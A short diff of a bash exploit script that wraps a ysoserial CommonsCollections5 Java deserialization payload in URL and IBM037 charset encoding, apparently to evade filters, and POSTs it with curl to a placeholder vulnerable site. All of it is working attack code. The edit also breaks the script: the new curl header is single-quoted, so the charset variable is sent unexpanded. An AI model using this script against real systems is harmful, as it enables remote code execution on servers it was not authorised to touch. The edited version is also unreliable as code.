@@ -48,9 +48,10 @@ function preproc {
     echo "${data:1}"
 }
 
-processors=(urldecode "enc IBM037" urlencode)
+charset=ibm037
+processors=(urldecode "enc '${charset^^}'" urlencode)
 static_data='param1=val1&state='
 payload=$(java -jar ysoserial.jar CommonsCollections5 "$1"|base64 -w0)
 data=$(printf "%s" "${static_data}${payload}"|preproc processors)
 
-curl -i -s -k -H 'Content-Type: application/x-www-form-urlencoded; charset=ibm037' -d "$data" 'https://vuln_site'
+curl -i -s -k -H 'Content-Type: application/x-www-form-urlencoded; charset=${charset,,}' -d "$data" 'https://vuln_site'
